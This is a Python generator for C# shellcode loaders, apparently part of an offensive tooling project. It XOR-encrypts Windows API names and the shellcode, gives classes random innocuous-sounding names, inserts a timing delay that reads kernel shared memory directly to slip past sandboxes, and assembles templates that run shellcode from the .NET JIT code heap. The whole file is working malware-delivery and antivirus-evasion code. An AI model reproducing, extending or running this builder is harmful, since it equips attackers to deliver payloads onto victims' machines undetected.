import random
from pathlib import Path


_PROJECT_ROOT = Path(__file__).resolve().parents[2]
_TEMPLATE_DIR = _PROJECT_ROOT / "templates" / "csharp"


def _load(name):
    return (_TEMPLATE_DIR / name).read_text()


def _generate_string_key(length=16):
    return bytes(random.randint(0, 255) for _ in range(length))


def _encrypt_string(s, key):
    enc = bytes((ord(c) ^ key[i % len(key)]) for i, c in enumerate(s))
    return ", ".join(f"0x{b:02X}" for b in enc)


def _enc_call(s, key):
    return f"S.D(new byte[] {{ {_encrypt_string(s, key)} }})"


_PREFIXES = [
    "Runtime", "Kernel", "Model", "Memory", "Buffer",
    "Stream", "Native", "Pipeline", "Dispatch", "Module",
    "Segment", "Handler", "Adapter", "Proxy", "Service",
    "Config", "Resource", "Context", "Session", "Component",
    "Factory", "Registry", "Binding", "Channel", "Protocol",
    "Storage", "Network", "Security", "System", "Platform",
    "Loader", "Cache", "Policy", "Token", "Transport",
    "Layout", "Format", "Schema", "Index", "Container",
    "Render", "Worker", "Bridge", "Driver", "Filter",
    "Parser", "Query", "State", "Event", "Host",
]

_SUFFIXES = [
    "Initializer", "Allocator", "Provider", "Dispatcher", "Manager",
    "Controller", "Validator", "Serializer", "Transformer", "Processor",
    "Executor", "Marshaller", "Enumerator", "Optimizer", "Scheduler",
    "Resolver", "Builder", "Analyzer", "Evaluator", "Generator",
    "Aggregator", "Coordinator", "Compositor", "Configurator", "Discoverer",
    "Formatter", "Interpreter", "Iterator", "Mapper", "Mediator",
    "Normalizer", "Observer", "Orchestrator", "Partitioner", "Propagator",
    "Recorder", "Replicator", "Selector", "Synchronizer", "Tokenizer",
    "Visualizer", "Accessor", "Binder", "Collector", "Comparer",
    "Converter", "Decorator", "Encoder", "Extractor", "Inspector",
]


def _random_name():
    return random.choice(_PREFIXES) + random.choice(_SUFFIXES)


def generate_names():
    return _random_name(), _random_name()


_DBG_MESSAGES = {
    "DBG_DECRYPTED_PH": '            Console.WriteLine("[*] Shellcode decrypted: " + sc.Length + " bytes");',
    "DBG_EXEC_PH":      '            Console.WriteLine("[*] Handing off to exec...");',
    "DBG_INIT_PH":      '            Console.WriteLine("[*] JIT pad initialized");',
    "DBG_SINK_PH":      '            Console.WriteLine("[*] Sink DM JIT\'d at 0x" + sinkFP.ToInt64().ToString("X") + " (" + nativeSize + " bytes)");',
    "DBG_COPIED_PH":    '            Console.WriteLine("[*] Shellcode copied to CLR HostCodeHeap");',
    "DBG_FLUSHED_PH":   '            Console.WriteLine("[*] Instruction cache flushed");',
    "DBG_THREAD_PH":    '            Console.WriteLine("[*] Trap thread launched");',
    "DBG_TRAP_PH":      '                Console.WriteLine("[*] Building trap DM (catch handler -> calli 0x" + shellcodeFP.ToInt64().ToString("X") + ")");',
}


def _apply_debug(source, debug):
    for placeholder, line in _DBG_MESSAGES.items():
        source = source.replace(placeholder, line if debug else "")
    return source


def generate(namespace, classname, encoded_hex, xor_key, delay, debug=False):

    str_key = _generate_string_key()
    str_key_hex = ", ".join(f"0x{b:02X}" for b in str_key)

    s_k32 = _enc_call("kernel32.dll", str_key)
    s_flush_icache = _enc_call("FlushInstructionCache", str_key)

    parts = []

    parts.append("using System;")
    parts.append("using System.Diagnostics;")
    parts.append("using System.Reflection;")
    parts.append("using System.Reflection.Emit;")
    parts.append("using System.Runtime.InteropServices;")
    parts.append("using System.Threading;")
    parts.append("")

    parts.append(f"namespace {namespace}")
    parts.append("{")

    helpers = _load("string_helpers.cs").replace("STRKEY_PH", str_key_hex)
    parts.append(helpers)

    parts.append(_load("delegates.cs"))
    parts.append(_load("resolver.cs"))

    exc = _load("exec.cs")
    exc = exc.replace("K32_PH", s_k32)
    exc = exc.replace("FLUSHICACHE_PH", s_flush_icache)
    parts.append(exc)

    delay_code = ""
    if delay > 0:
        ticks = delay * 600000000
        delay_code = f"""
            long wakeup = Marshal.ReadInt64((IntPtr)0x7FFE0008) + {ticks}L;
            while (Marshal.ReadInt64((IntPtr)0x7FFE0008) < wakeup)
                Thread.SpinWait(100);
"""

    entry = _load("entry_point.cs")
    entry = entry.replace("CLASSNAME_PH", classname)
    entry = entry.replace("SHELLCODE_PH", encoded_hex)
    entry = entry.replace("XORKEY_PH", str(xor_key))
    entry = entry.replace("DELAY_PH", delay_code)
    parts.append(entry)

    parts.append("}")

    return _apply_debug("\n".join(parts), debug)
